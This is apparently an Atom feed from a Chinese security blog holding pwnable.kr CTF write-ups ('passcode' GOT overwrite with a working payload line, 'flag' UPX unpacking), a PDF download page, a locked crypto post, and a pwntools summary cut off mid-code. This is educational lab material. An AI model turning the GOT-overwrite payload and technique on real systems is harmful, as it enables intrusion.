<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-05-24T03:03:13.719Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://muzibing.github.io/2020/05/24/2020.05.24%EF%BC%88118%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/24/2020.05.24（118）/</id>
    <published>2020-05-24T02:59:01.632Z</published>
    <updated>2020-05-24T03:03:13.719Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（五）[passcode]</title>
    <link href="https://muzibing.github.io/2020/05/15/2020.05.05%EF%BC%88117%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/15/2020.05.05（117）/</id>
    <published>2020-05-14T16:00:00.000Z</published>
    <updated>2020-05-16T01:23:30.868Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy一-基础知识font"></a> <font color="navy">一、基础知识</font></h3><h4 id="font-color-blue1mov-eaxgs0x14指令的作用font"><a class="markdownIt-Anchor" href="#font-color-blue1mov-eaxgs0x14指令的作用font"></a> <font color="blue">1.<code>mov eax,gs:0x14</code>指令的作用</font></h4><blockquote><p>gcc编译器专门为防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。</p></blockquote><p>简单来说就是，<code>从gs:0x14的地方取出来，然后在函数返回之前对比栈中的这个随机值和gs:0x14来断定是否发生栈溢出</code>。</p><h4 id="font-color-blue2lea和mov指令的区别font"><a class="markdownIt-Anchor" href="#font-color-blue2lea和mov指令的区别font"></a> <font color="blue">2.<code>lea</code>和<code>mov</code>指令的区别</font></h4><p>◫ <code>lea</code>：将<code>源操作数的地址</code>传到目的操作数中</p><p>◫ <code>mov</code>：将<code>数据从源操作数</code>传到目的操作数中</p><p>例如：The address of ebx is <code>0xffe1c1e8</code> and data is <code>0xf7fadd20</code> in  <code>0xffe1c178</code>(<code>0xffe1c1e8-0x70</code>).</p><p>⇱ <code>lea edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>的地址  <code>0xffe1c178</code>传到<code>edx</code>寄存器中</p><p>⇱ <code>mov edx,[ebx-0x70]</code>：是将<code>ebx-0x70</code>地址中的数据<code>0xf7fadd20</code>传到<code>edx</code>寄存器中</p><p><img src="/images/117-1.png" alt></p><h4 id="font-color-blue3scanf的原理font"><a class="markdownIt-Anchor" href="#font-color-blue3scanf的原理font"></a> <font color="blue">3.<code>scanf</code>的原理</font></h4><p>需要注意的是：</p><blockquote><ol><li>用户输入的字符，会以<code>ASCII码形式</code>存储在键盘缓冲区；</li><li>每调用一次scanf函数，就从<font color="navy">键盘缓冲区读走一个字符，相当于清除缓冲区</font>；</li><li>若用户一次输入n个字符，则前n次调用scanf函数都不需要用户再次输入，直到把缓冲区的数据全部读取(清除)干净；</li><li>scanf取地址<code>&amp;</code>符号的作用：是将从键盘缓冲区读取的字符放到<code>&amp;var</code>地址中，其中字符串无需&amp;，因为字符串本身就代表地址的开始；</li><li>调用scanf()函数时，用户最后输入的回车也会储存在键盘缓冲区；(见如下程序)</li></ol></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序在VC++6.0中的显示结果是：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">49</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><blockquote><p>下面以一个例子做个简单介绍：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(ch)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case1\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case2\n"</span>);</span><br><span class="line">                <span class="comment">// fflush(stdin);    //清除缓冲区</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"case3\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1235</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">case2</span></span><br><span class="line"><span class="comment">case3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">case1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>对于第二个输入1，为什么不会继续循环呢？</p><blockquote><p>因为当输入“1”后，相当于输入了“1”和“回车”，键盘缓冲区将保存它们的ASCII码：49 10，但是因为scanf(&quot;%c&quot;,&amp;a);语句将把ASCII码49送入a中，所以第一次执行完scanf(&quot;%c&quot;,&amp;a);语句后，键盘缓冲区中剩下的内容为：10，然后进入switch语句，因为现在a=‘1’，所以执行case '1’分支，break后继续while循环，开始第二次执行scanf(&quot;%c&quot;,&amp;a);语句，但这次程序不会停下来等待输入，因为键盘缓冲区中还有剩余的ASCII码：10。因此第二次执行scanf(&quot;%c&quot;,&amp;a);语句时，程序直接将缓冲区中的ASCII码10送入a中，接着又进入switch语句，但是现在a=‘CR’，所以转到default分支，执行return后退出循环和函数。</p></blockquote><h3 id="font-color-navy二-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy二-题目分析font"></a> <font color="navy">二、题目分析</font></h3><p>1.首先连上服务器看一下<code>passcode.c</code>文件：</p><p><img src="/images/117-2.png" alt></p><blockquote><p>从图中可以看出，<code>main</code>函数中先后调用了两个函数，即<code>welcome</code>和<code>login</code>函数：</p><ul><li>在<code>welcome</code>函数中，需要输入长度为100的<code>name</code>字符串；</li><li>在<code>login</code>函数中需要输入两个变量的值<code>passcode1</code>和<code>passcode2</code>，并且在输入<code>passcode1</code>后清除了<code>stdin</code>中的缓存，也就是防止在输入<code>passcode1</code>的时候，将值给<code>passcode1</code>。更为重要的一点是该函数中的两个<code>scanf</code>输入整数类型时，没有加<code>&amp;</code>符号，也就意味着<code>将passcode1和passcode2中的值当作地址，然后将键盘中的缓存输入这两个地址指向的内存中，</code>示意图如下：</li></ul></blockquote><p><img src="/images/117-3.png" alt></p><blockquote><ul><li>如果带有<code>&amp;</code>符号，正常的情况下如下图：</li></ul></blockquote><p><img src="/images/117-4.png" alt></p><p>2.<code>file passcode</code>查看一下ELF文件的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ file passcode</span><br><span class="line">passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>可得可执行文件<code>passcode</code>是一个32位的ELF可执行文件</p></blockquote><p>3.<code>checksec passcode</code>查看一下该可执行文件开启了什么保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passcode@pwnable:~$ checksec passcode</span><br><span class="line">[*] &apos;/home/passcode/passcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELROd</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>可得：</p><ul><li>对GOT表具有写的权限</li><li>开启了Cookie，也就是金丝雀保护</li><li>栈不可知性</li><li>没有内存开启地址随机化</li></ul></blockquote><p>4.如何才能执行<code>system</code>函数？</p><blockquote><ul><li>第一种方法就是使得<code>passcode1==338150 &amp;&amp; passcode2==13371337</code>，但是我们无法往passcode1和passcode2中再写入值，而是只能向这两个变量中的值所指向的内存地址写入值，那么这种方法❌</li><li>第二种方法就是通过变量<code>name</code>的输入实现栈溢出，但是passcode开启了金丝雀，所以无法实现栈溢出❌</li><li>第三种方法就是利用ret2libc技术✔</li></ul></blockquote><h3 id="font-color-navy三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy三-解题步骤font"></a> <font color="navy">三、解题步骤</font></h3><p>1.<code>scp -P 2222 passcode@pwnable:home/passcode/passcode /tmp</code>将<code>passcode</code>从远程服务器上下载到本地，然后用gdb进行调试，寻找<code>name</code>、<code>passcode1</code>和<code>passcode2</code>的位置：</p><p><img src="/images/117-5.png" alt></p><blockquote><p>从上图可以看出<code>name</code>的起始地址为<code>ebp-0x70</code>，在本次调试中为<code>0xffd3bdc8</code></p></blockquote><p><img src="/images/117-6.png" alt></p><blockquote><p>从上图可以看出<code>passcode1</code>的起始地址为<code>ebp-0x10</code>，在本次调试中为<code>0xffd3be28</code>，而<code>0xffd3be28</code>中的值指向了<code>0xffd3be84</code>，<code>0xffd3be84</code>中的值为0</p></blockquote><p><img src="/images/117-7.png" alt></p><blockquote><p>从上图可以看出<code>passcode2</code>的起始地址为<code>ebp-0xc</code>，在本次调试中为<code>0xffd3be2c</code>，而<code>0xffd3be2c</code>中的值指向了<code>0x3b8fa100</code></p></blockquote><p>虽然都是<code>ebp-.</code>但是对于<code>welcome</code>和<code>login</code>函数中的<code>ebp</code>是否一样呢？我们看上面的三张图片：</p><ul><li>第一张是<code>welcome</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li><li>第二张是<code>login</code>函数的，其中<code>ebp</code>的地址为<code>EBP: 0xffd3be38 --&gt; 0xffd3be58 --&gt; 0x0</code></li></ul><p>所以可以得到如下的示意图：</p><p><img src="/images/117-8.png" alt></p><p>2.通过题目中的<code>passcode.c</code>源码以及gdb的调试结果可以得到，passcode1的位置处于name内存的最后四个字节，可以通过上面的示意图得出该结论，因此我们可以在输入<code>name</code>变量值的时候，将<code>passcode1</code>中的值进行修改，可以使得我们往特定的地址输入值，那么我们可以利用该思想进行绕过。我们看一下 system(&quot;/bin/cat flag&quot;);语句前面是printf(“Login OK!\n”);语句，我们是不是可以绕过if的判断条件，直接执行printf(“Login OK!\n”);语句或者system(&quot;/bin/cat flag&quot;);，在这里我们可以修改<code>fflush</code>函数的<strong>GOT表</strong>，要注意这里修改的是GOT表，因为<code>RELRO: Partial RELROd</code>说明GOT表具有可写的权力，具体的如下方的示意图：</p><p><img src="/images/117-9.png" alt></p><p>3.上图只是一个大概的过程，可知我们的构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*96+&apos;\x00\xa0\x04\x08&apos;+&apos;\n&apos;+&apos;134514135&apos;+&apos;\n&apos;&quot;| ./passcode</span><br></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><blockquote><p>这里要注意的是：</p><ul><li>在修改<code>0x804a004</code>时要用小段进行书写，因为<code>Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</code>魔数的第6个字是<code>01</code>代表小段。</li><li>在输入<code>0x80485d7</code>时，因为要求是整数，所以要将<code>0x80485d7</code>变为<code>134514135</code></li></ul></blockquote><h3 id="font-color-navy四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy四-参考文章font"></a> <font color="navy">四、参考文章</font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/47d484b9227e" target="_blank" rel="noopener">栈溢出攻击及防护方法简介</a></li><li><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></li><li><a href="https://github.com/JnuSimba/LinuxSecNotes/blob/master/Linux%20%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E7%9F%A5%E8%AF%86/Linux%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.md" target="_blank" rel="noopener">Linux 栈溢出保护机制</a></li><li><a href="https://zhuanlan.zhihu.com/p/33360460" target="_blank" rel="noopener">键盘缓冲区（scanf原理）</a></li><li><a href="https://www.cnblogs.com/qihuanye-229110/articles/11149715.html" target="_blank" rel="noopener">C语言scanf函数原理</a></li><li><a href="https://www.cnblogs.com/shuaishuaidefeizhu/p/5886899.html" target="_blank" rel="noopener">scanf()函数原理</a></li><li><a href="https://bbs.pediy.com/thread-247956.htm" target="_blank" rel="noopener">[原创]pwnable.kr passcode</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>《梦炬手册》五周年纪念版下载页</title>
    <link href="https://muzibing.github.io/2020/05/04/2020.05.04%EF%BC%88116%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/04/2020.05.04（116）/</id>
    <published>2020-05-03T16:00:00.000Z</published>
    <updated>2020-05-04T10:28:31.938Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/pdf/%E3%80%8A%E6%A2%A6%E7%82%AC%E6%89%8B%E5%86%8C%E3%80%8B.pdf">点击下载文件</a></p><object data="/pdf/《梦炬手册》.pdf" type="application/pdf" width="100%" height="1000"></object>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;/pdf/%E3%80%8A%E6%A2%A6%E7%82%AC%E6%89%8B%E5%86%8C%E3%80%8B.pdf&quot;&gt;点击下载文件&lt;/a&gt;&lt;/p&gt;
&lt;object data=&quot;/pdf/《梦炬手册》.pdf&quot; type=&quot;application
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（四）[flag]</title>
    <link href="https://muzibing.github.io/2020/05/02/2020.05.02%EF%BC%88115%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/02/2020.05.02（115）/</id>
    <published>2020-05-01T16:00:00.000Z</published>
    <updated>2020-05-15T14:09:09.834Z</updated>
    
    <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=412935552&bvid=BV1FV411d7u7&cid=186570036&page=2" scrolling="no" border="0" frameborder="0" framespacing="0" allowfullscreen="true" width="100%" height="500"> </iframe><!--五四特别博客：内附何冰五四演讲视频《后浪》，致敬五四青年，奋发有为！--><h3 id="font-color-navy0x00-相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识font"></a> <font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="font-color-blue1upx-加壳font"><a class="markdownIt-Anchor" href="#font-color-blue1upx-加壳font"></a> <font color="blue"><code>1.UPX 加壳</code></font></h4><blockquote><p>这里就简单介绍一下UPX加壳的原理，详细内容以后会进行专题研究。</p></blockquote><p><img src="/images/115-1.png" alt></p><p>通过上图可以看出最重要的部分应该为<code>Compressed data</code>和<code>Stub</code>，下面简单的讲一下UPX加壳的原理以及加壳后如何执行程序。</p><p><code>UPX的工作原理如下</code>：首先将程序压缩， 所谓的压缩包括两方面：</p><ul><li><p>一方面在程序的开头或者其他合适的地方插入一段代码</p></li><li><p>另一方面是将程序的其他地方做压缩（也就是上面讲到的压缩），压缩也可以叫做加密，因为压缩后的程序比较难看懂，原来的代码有很大的不同；</p></li></ul><p>当程序执行时：实时的对程序解压缩。解压缩功能是在<code>Stub</code>节区插入的代码完成的功能，联起来就是：upx可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。</p><p><img src="/images/115-2.png" alt></p><p>从上图可以看出在加壳后代码段的信息被压缩成<code>Compressed Data</code>节区，那么在运行时程序会根据<code>Stub</code>节区的内容将<code>Compressed Data</code>进行解压然后运行程序。</p><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@kali:~/Documents/CTF/PWN/pwnable.kr/flag# file flag </span><br><span class="line">flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure><blockquote><p>查看文件信息，从得到的结果可以看出flag是一个64位ELF文件。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# checksec flag </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/pwnable.kr/flag/flag&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><blockquote><p>检查flag文件开启了什么保护，通过结果可以看出：</p><p>      ① 对GOT表可写可读</p><p>      ② 没有开启金丝雀保护</p><p>      ③ 栈可执行</p><p>      ④ 没有开启地址随机化</p><p>      ⑤ 有可写可读可执行段</p><p>      ⑥ 进行UPX加壳</p><p>可以看出flag文件的大部分保护都没有开启，只是有了一个UPX加壳</p></blockquote><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# upx -d f1ag -o flag</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><blockquote><p>① 对flag文件进行脱壳，得到一个脱壳后的flag，其中文件由335288bits扩展成883745bits，格式是Linux环境下的amd64</p><p>② 然后用IDA-64打开脱壳后的flag文件，得到<code>main</code>函数伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will malloc() and strcpy the flag there. take it."</span>, argv, envp);</span><br><span class="line">  LODWORD(v3) = <span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  sub_400320(v3, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到<code>sub_400320</code>函数的第二个参数为flag，双击参数flag，得到我们想要的flag。</p></blockquote><p><img src="/images/115-3.png" alt></p><h3 id="font-color-navy0x03-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-参考文章font"></a> <font color="navy"><code>0x03 参考文章</code></font></h3><ul><li><p><a href="https://bbs.pediy.com/thread-248779.htm" target="_blank" rel="noopener">upx原理分析</a></p></li><li><p><a href="https://www.cnblogs.com/iBinary/p/7764483.html" target="_blank" rel="noopener">脱壳第三讲,UPX压缩壳,以及补充壳知识</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;//player.bilibili.com/player.html?aid=412935552&amp;bvid=BV1FV411d7u7&amp;cid=186570036&amp;page=2&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Dan-Boneh密码学课程之学习笔记（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.30%EF%BC%88114%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.30（114）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-05-25T02:48:18.111Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0e63f96acf506ec16abd4f7f6bb5a3ef7cfe7ede1182057eb85ba500621f0298"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="Crypto" scheme="https://muzibing.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="https://muzibing.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>pwntools的简单总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.29%EF%BC%88112%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.29（112）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-04-30T03:25:10.656Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基本模块"><a href="#一、基本模块" class="headerlink" title="一、基本模块"></a><font color="navy">一、基本模块</font></h3><h4 id="1-asm-disasm"><a href="#1-asm-disasm" class="headerlink" title="1.asm/disasm"></a><font color="blue"><code>1.asm/disasm</code></font></h4><p><code>功能</code>：用来进行汇编/反汇编。</p><p><code>例子</code>：</p><p>asm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enhex(asm(<span class="string">'mov eax, 0'</span>))</span><br><span class="line"><span class="string">'b800000000'</span></span><br></pre></td></tr></table></figure><p>disasm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(disasm(unhex(<span class="string">'6a0258cd80ebf9'</span>)))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>但是，大多数时候不需要编写自己的shellcode！ pwntools带有pwnlib.shellcraft模块，该模块中装有有用的省时的shellcode。 假设我们要先设置setreuid（getuid()，getuid()），然后将文件描述符4复制到stdin，stdout和stderr，然后弹出一个shell！如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 